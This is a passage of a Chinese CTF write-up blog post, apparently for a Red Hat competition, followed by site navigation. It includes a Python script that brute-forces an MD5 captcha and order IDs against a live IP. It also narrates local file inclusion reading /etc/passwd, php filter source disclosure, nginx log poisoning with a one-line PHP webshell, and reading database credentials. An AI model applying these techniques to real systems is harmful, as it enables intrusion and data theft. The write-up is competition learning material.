worker.join()</span><br></pre></td></tr></table></figure></p>
+<p>得flag<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/27.png" alt="image">也可以先生成一个md5表，然后查表，这样比较快，贴一下impakho大佬的代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.132.95.234/%s'</span></span><br><span class="line">headers = &#123;<span class="string">'Host'</span>: <span class="string">'www.tmvb.com'</span>, <span class="string">'Accept-Language'</span>: <span class="string">'ja'</span>, <span class="string">'Referer'</span>: <span class="string">'www.dww.com'</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">md5_table = &#123;&#125;</span><br><span class="line">target = (<span class="number">256</span> ** <span class="number">3</span>) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Preparing md5 rainbow table...'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    md5_table[hashlib.md5(str(i)).hexdigest()[:<span class="number">6</span>]] = str(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(md5_table) &gt;= target: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> len(md5_table) % <span class="number">100000</span> == <span class="number">0</span>: <span class="keyword">print</span> str(len(md5_table)) + <span class="string">' / '</span> + str(target)</span><br><span class="line"><span class="keyword">print</span> str(len(md5_table)) + <span class="string">' / '</span> + str(target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9588</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9500</span>, <span class="number">10000</span>):</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = s.get(url % <span class="string">'5a560e50e61b552d34480017c7877467info.php'</span>, headers=headers)</span><br><span class="line">        r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        code = r.text.split(<span class="string">"=== '"</span>)[<span class="number">1</span>].split(<span class="string">"'"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> md5_table: <span class="keyword">break</span></span><br><span class="line">    payload = &#123;<span class="string">'TxtTid'</span>: i, <span class="string">'code'</span>: md5_table[code]&#125;</span><br><span class="line">    r = s.post(url % <span class="string">'api.php?action=report'</span>, headers=headers, data=payload)</span><br><span class="line">    r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'TxtTid=%d: %s'</span> % (i, r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"There's no such order."</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text: <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>他的博客上说的是先生成彩虹表，我个人觉得他的做法跟彩虹表没多大关系，更像是单纯的生成表然后查表。他是每次发出get请求去拿到验证码，如果验证码在表里才去下一步，这个思路值得学习。<br><strong>flag{hong_mao_ctf_hajimaruyo}</strong></p>
+<h1 id="0x05-biubiubiu"><a href="#0x05-biubiubiu" class="headerlink" title="0x05 biubiubiu"></a>0x05 biubiubiu</h1><p> 这次在你面前的网站看起来很复杂，接受挑战吧！<br> 进到login页面，任意账号密码登陆，然后，发现url有个index.php/page=??，猜测有文件包含，改成page=../../../etc/passwd，果然存在漏洞<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/28.png" alt="image">然后发现，phpfilter流可以实现对文件的任意读取，php的伪协议我会在另一篇文章中详细讲。然后，拿到index.php、users.sql、send.php的源码，这题有个非预期的解法，预期解法我还没弄懂，在这里先讲一下非预期解法，我好菜啊。<br> 因为每次访问服务器，nginx都会记录log，可以利用这点向日志文件插入php代码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/29.png" alt="image">有个小技巧，一句话木马与phpinfo连用，这样可以体现出一句话木马有没有插入成功<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/30.png" alt="image">可以看到，日志文件显示出了phpinfo，同时也说明木马插入成功了。这时候，上菜刀。在/var/www/html中找到数据库的配置文件<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/31.png" alt="image">然后，连接数据库<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/32.png" alt="image">拿到flag<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/33.png" alt="image">继续努力，fight fight…</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/requests/" rel="tag"># requests</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/04/wireshark/" rel="next" title="wireshark的基本使用及分析流量包的技巧">
+                <i class="fa fa-chevron-left"></i> wireshark的基本使用及分析流量包的技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-Not-only-wireshark"><span class="nav-number">1.</span> <span class="nav-text">0x00 Not only wireshark</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-听说你们喜欢手工爆破"><span class="nav-number">2.</span> <span class="nav-text">0x01  听说你们喜欢手工爆破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-这是道web题？"><span class="nav-number">3.</span> <span class="nav-text">0x02 这是道web题？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-simple-upload"><span class="nav-number">4.</span> <span class="nav-text">0x03 simple upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-shopping-log"><span class="nav-number">5.</span> <span class="nav-text">0x04 shopping log</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-biubiubiu"><span class="nav-number">6.</span> <span class="nav-text">0x05 biubiubiu</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
